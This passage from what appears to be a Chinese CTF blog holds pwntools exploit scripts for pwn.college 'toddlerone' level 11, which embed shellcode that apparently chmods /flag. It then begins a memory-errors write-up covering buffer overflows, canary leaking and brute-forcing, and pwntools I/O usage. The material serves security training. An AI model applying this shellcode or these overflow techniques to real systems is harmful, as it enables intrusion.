punctuation">(</span>c<span class="token punctuation">)</span>    d <span class="token operator">=</span> p64<span class="token punctuation">(</span>d<span class="token punctuation">)</span>    read <span class="token operator">=</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>    write <span class="token operator">=</span> p64<span class="token punctuation">(</span>write<span class="token punctuation">)</span>    stm <span class="token operator">=</span> p64<span class="token punctuation">(</span>stm<span class="token punctuation">)</span>    open_ <span class="token operator">=</span> p64<span class="token punctuation">(</span>open_<span class="token punctuation">)</span>    imm <span class="token operator">=</span> p64<span class="token punctuation">(</span>imm<span class="token punctuation">)</span>    sys <span class="token operator">=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>    jmp <span class="token operator">=</span> p64<span class="token punctuation">(</span>jmp<span class="token punctuation">)</span>    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;d&#125;'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> read<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> write<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> open_<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> stm<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> imm<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> sys<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token punctuation">,</span> jmp<span class="token punctuation">)</span>        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>    <span class="token keyword">return</span> formatted_data_listelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level11.0"</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x808</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0cd</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x1f9</span>    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">#  jmp * a</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x900aEBE78948666A</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm a, nop; jmp 0xa; mov rdi, rsp; push 0x66</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x050F585A6A5E046A</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm a, syscall; pop rax; push 0x5A; pop rsi; push 0x4 </span><span class="token punctuation">]</span>payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x08</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span> jmp<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level11/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level11.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token triple-quoted-string string">"""/flag  ---> 2f 66 6c 61 67imm 0x8stm 0x40sys 0x4jmp 0x20op      arg1        arg2        register    value        syscall   a   0x20b   0x4c   0x1d   0x40s   0x8i   0x10f   0x2"""</span><span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> jmp<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> p64<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    b <span class="token operator">=</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    c <span class="token operator">=</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span>    d <span class="token operator">=</span> p64<span class="token punctuation">(</span>d<span class="token punctuation">)</span>    read <span class="token operator">=</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>    write <span class="token operator">=</span> p64<span class="token punctuation">(</span>write<span class="token punctuation">)</span>    stm <span class="token operator">=</span> p64<span class="token punctuation">(</span>stm<span class="token punctuation">)</span>    open_ <span class="token operator">=</span> p64<span class="token punctuation">(</span>open_<span class="token punctuation">)</span>    imm <span class="token operator">=</span> p64<span class="token punctuation">(</span>imm<span class="token punctuation">)</span>    sys <span class="token operator">=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>    jmp <span class="token operator">=</span> p64<span class="token punctuation">(</span>jmp<span class="token punctuation">)</span>    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;d&#125;'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> read<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> write<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> open_<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> stm<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> imm<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> sys<span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token punctuation">,</span> jmp<span class="token punctuation">)</span>        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>    <span class="token keyword">return</span> formatted_data_listelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level11.1"</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    p64<span class="token punctuation">(</span><span class="token number">0x808</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    p64<span class="token punctuation">(</span><span class="token number">0x0cd</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x1f9</span>    <span class="token string">b'\&#123;b&#125;\&#123;stm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">#  jmp * a</span>    p64<span class="token punctuation">(</span><span class="token number">0x900aEBE78948666A</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, nop; jmp 0xa; mov rdi, rsp; push 0x66</span>    p64<span class="token punctuation">(</span><span class="token number">0x050F585A6A5E046A</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, syscall; pop rax; push 0x5A; pop rsi; push 0x4 </span><span class="token punctuation">]</span>payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x08</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span> jmp<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level11/shellcode_2.bin"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level11.1"</span><span class="token punctuation">)</span><span class="token comment"># 明确重定向文件描述符</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-memory-errors-Writeup</title>
      <link href="/2024/07/30/pwn-college-memory-writeup/"/>
      <url>/2024/07/30/pwn-college-memory-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college-memory-errors"><a href="#pwn-college-memory-errors" class="headerlink" title="pwn.college memory-errors"></a>pwn.college memory-errors</h1><p><a href="https://pwn.college/program-security/memory-errors/">https://pwn.college/program-security/memory-errors/</a></p><p>整体思路：</p><ol><li>没有开启canary保护，缓冲区直接溢出返回地址。</li><li>开启canary保护，有puts等回显，可以溢出显示canary的值。然后重复调用函数，溢出返回地址。</li><li>开启canary保护，有puts等回显，缓冲区在创建的时候没有置0，可以用过gdb调试，观察缓冲区位置中是否包含canary的值。</li><li>开启canary保护，没有回显，只能爆破。且这种方式仅限于监听端口的服务端类似level15。如果是独立的程序，每次重启，canary都会重新计算，而且这一次只能接受一次输入。没有爆破的可能。</li></ol><h2 id="值得记录的问题"><a href="#值得记录的问题" class="headerlink" title="值得记录的问题"></a>值得记录的问题</h2><h3 id="1-python-中-pwn库-的使用"><a href="#1-python-中-pwn库-的使用" class="headerlink" title="1. python 中 pwn库 的使用"></a>1. python 中 pwn库 的使用</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">output <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Send'</span><span class="token punctuation">)</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 只有这种方式会导致程序退出</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">if</span> p<span class="token punctuation">.</span>poll<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>  <span class="token comment"># 如果进程已经结束，poll() 将返回退出状态码</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Process has ended."</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Process is still running."</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 pwntools 中，如果你调用 <code>p.recvall()</code>，它会尝试接收目标进程的所有输出数据，直到进程结束或达到指定的超时时间。然而，<code>p.recvall()</code> 并不会自动接收到之前已经产生但没有显式接收的输出数据。 p.recvall() 只会接收从调用时起存在的输出数据。</p><p><strong>理解数据接收</strong><br>在交互式程序中，如果你在前半部分没有调用 <code>p.recvline()</code>、<code>p.recv()</code> 等接收函数，且程序有输出数据，那么这些输出数据会被缓存在内部的接收缓冲区中。调用 <code>p.recvall()</code> 后，它会读取缓冲区中的所有数据，直到进程终止或达到超时。<br>因此，如果你在交互式过程中错过了某些输出数据（例如没有调用接收函数），调用 <code>p.recvall() </code>时仍然会接收这些数据（因为它们仍在缓冲区中），但是如果某些输出数据被丢弃或错过了（例如由于缓冲区溢出或其他原因），则无法恢复。</p><p>示例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/challenge/interact_program'</span><span class="token punctuation">)</span><span class="token comment"># 交互的前半部分，可能发送了一些输入但没有接收输出</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'first command'</span><span class="token punctuation">)</span><span class="token comment"># 假设程序输出了一些内容但没有调用 `p.recvline()` 进行接收</span><span class="token comment"># 交互的后半部分，调用 `p.recvall()`</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上述示例中，如果在发送 <code>first command</code> 后，程序产生了一些输出而没有显式调用 <code>p.recvline()</code> 等函数接收，这些输出数据会在 <code>p.recvall() </code>调用时被接收，因为它们仍在缓冲区中。输出缓冲区：如果程序输出大量数据且未及时接收，可能会导致缓冲区溢出，丢失数据。交互性：在交互式程序中，确保在合适的时机接收和处理输出，以避免错过关键信息。总的来说，<code>p.recvall()</code>可以接收到调用前程序产生的所有未被处理的输出数据，但它只会接收从调用时刻起存在的所有数据。对于交互式程序，确保在每次交互后适当地接收输出数据是重要的，以免错过程序产生的重要输出。</p><h4 id="处理交互式程序的输出"><a href="#处理交互式程序的输出" class="headerlink" title="处理交互式程序的输出"></a>处理交互式程序的输出</h4><p><strong>如果程序是交互式的，并且需要多次输入，那么在每次输入后立即调用 p.recvall() 或类似的阻塞方法（如 p.recvuntil()、p.recv() 等）可能会导致脚本卡住，因为这些方法通常会等待直到有数据可读或者达到超时时间。如果程序没有立即输出数据，脚本会一直等待。</strong></p><p>在处理需要多次输入的交互式程序时，通常使用如下几种方法：</p><ol><li><p>使用 p.recvline() 或 p.recvuntil()<br>这些方法可以接收一行数据或者直到特定的标志出现时停止。这对于读取预期的输出提示符或者阶段性信息非常有用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/challenge/interact_program'</span><span class="token punctuation">)</span><span class="token comment"># 发送第一次输入</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'first command'</span><span class="token punctuation">)</span><span class="token comment"># 接收并处理第一次输出，假设我们知道它会输出一行结束</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 发送第二次输入</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'second command'</span><span class="token punctuation">)</span><span class="token comment"># 接收并处理第二次输出，直到出现特定的提示符</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'expected prompt'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置超时<br>设置接收方法的超时时间，以避免程序长时间等待。这对处理未知长度的输出特别有用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/challenge/interact_program'</span><span class="token punctuation">)</span><span class="token comment"># 发送第一次输入</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'first command'</span><span class="token punctuation">)</span><span class="token comment"># 尝试接收输出，设定超时</span><span class="token keyword">try</span><span class="token punctuation">:</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No more data, process may have ended."</span><span class="token punctuation">)</span><span class="token comment"># s发送第二次输入</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'second command'</span><span class="token punctuation">)</span><span class="token comment"># 接收并处理第二次输出</span><span class="token keyword">try</span><span class="token punctuation">:</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No more data, process may have ended."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>分步处理和条件判断<br>根据程序的交互过程，分步处理输入输出。对于每一步，判断是否有足够的输出数据来决定下一步操作。</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/challenge/interact_program'</span><span class="token punctuation">)</span><span class="token comment"># 发送第一次输入</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'first command'</span><span class="token punctuation">)</span><span class="token comment"># 尝试接收部分输出</span><span class="token keyword">try</span><span class="token punctuation">:</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Process terminated unexpectedly."</span><span class="token punctuation">)</span><span class="token comment"># 如果程序预期有多次输入输出循环，可以继续相同的模式处理</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'second command'</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Process terminated unexpectedly."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>非阻塞模式<br>如果需要非阻塞地处理，可以使用 p.poll() 方法来检查进程状态，或者使用线程来处理 I/O。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/challenge/interact_program'</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">)</span><span class="token comment"># 发送第一次输入</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'first command'</span><span class="token punctuation">)</span><span class="token comment"># 非阻塞地检查是否有输出</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> p<span class="token punctuation">.</span>poll<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> output<span class="token 